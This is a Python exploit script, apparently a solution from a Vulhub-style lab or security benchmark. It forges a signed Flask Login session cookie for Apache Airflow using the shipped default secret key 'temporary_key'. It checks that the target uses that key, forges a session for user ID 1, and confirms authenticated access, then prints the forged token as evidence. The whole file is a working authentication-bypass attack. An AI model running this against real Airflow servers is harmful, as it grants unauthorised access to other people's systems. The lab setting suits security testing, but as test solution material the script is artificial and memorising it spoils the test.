"""Forge an Airflow session using the shipped default session key."""

import base64
import hashlib
import hmac
import json
import os
import time
import urllib.error
import urllib.request
from http.cookies import SimpleCookie


SESSION_KEY = "temporary_key"
USERNAME = "vulhub"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Expose authentication redirects to the probe."""

    def redirect_request(
        self, request: urllib.request.Request, response: object, code: int,
        message: str, headers: object, url: str,
    ) -> None:
        return None


def base64url(data: bytes) -> str:
    """Encode a Flask session component."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def session_signature(message: bytes) -> str:
    """Sign session data with Flask's cookie session parameters."""
    signing_key = hmac.new(
        SESSION_KEY.encode("ascii"), b"cookie-session", hashlib.sha1
    ).digest()
    return base64url(hmac.new(signing_key, message, hashlib.sha1).digest())


def forge_session(user_id: int) -> str:
    """Build a signed Flask Login session for a database user."""
    payload = json.dumps(
        {"user_id": str(user_id), "_fresh": False, "_permanent": True},
        separators=(",", ":"),
    ).encode("utf-8")
    timestamp = int(time.time())
    timestamp_bytes = timestamp.to_bytes((timestamp.bit_length() + 7) // 8, "big")
    message = f"{base64url(payload)}.{base64url(timestamp_bytes)}".encode("ascii")
    return f"{message.decode('ascii')}.{session_signature(message)}"


def probe(url: str, token: str = "") -> tuple[int, str, str]:
    """Request an endpoint without following redirects."""
    headers = {"Cookie": f"session={token}"} if token else {}
    request = urllib.request.Request(url, headers=headers)
    opener = urllib.request.build_opener(NoRedirect())
    try:
        response = opener.open(request, timeout=15)
    except urllib.error.HTTPError as error:
        response = error
    return (
        response.status,
        response.read().decode("utf-8", errors="replace"),
        response.headers.get("Set-Cookie", ""),
    )


def login_cookie(base_url: str) -> str:
    """Fetch the login page and its session cookie."""
    status, body, cookie_header = probe(base_url + "/admin/airflow/login")
    if status != 200 or "Sign in to Airflow" not in body:
        raise RuntimeError("The password login page was not served")
    cookies = SimpleCookie()
    cookies.load(cookie_header)
    if "session" not in cookies:
        raise RuntimeError("The login page did not issue a session cookie")
    return cookies["session"].value


def main() -> None:
    """Prove the default key and submit the forged session evidence."""
    base_url = os.environ.get("REMOTE_TARGET_URL", "http://localhost:18032").rstrip("/")
    issued_cookie = login_cookie(base_url)
    message, signature = issued_cookie.rsplit(".", 1)
    if not hmac.compare_digest(signature, session_signature(message.encode("ascii"))):
        raise RuntimeError("The issued session did not use the default key")
    identity_url = base_url + "/challenge/whoami"
    unauthenticated, _, _ = probe(identity_url)
    invalid, _, _ = probe(identity_url, "invalid")
    if unauthenticated != 302 or invalid != 302:
        raise RuntimeError("The identity endpoint is not protected")
    token = forge_session(1)
    status, body, _ = probe(identity_url, token)
    if status != 200 or body != USERNAME:
        raise RuntimeError(f"Forged session was rejected: {status} {body[:100]}")
    print(json.dumps({"evidence_payload": {"token": token, "user": USERNAME}}))


if __name__ == "__main__":
    main()
